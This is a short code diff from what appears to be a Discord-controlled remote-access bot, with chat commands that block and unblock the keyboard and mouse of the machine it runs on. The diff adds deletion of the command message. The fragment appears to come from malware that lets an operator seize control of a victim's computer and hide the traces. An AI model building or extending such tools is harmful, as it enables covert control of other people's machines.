@@ -23,6 +23,7 @@ elif message.content == '.block-input':
     await message.channel.send("```Input has been blocked. Unblock it by using .unblock-input```")
 
 elif message.content == '.unblock-input':
+    await message.delete()
     keyboard_listener.stop()
     mouse_listener.stop()
     await message.channel.send("```Input has been unblocked.```")
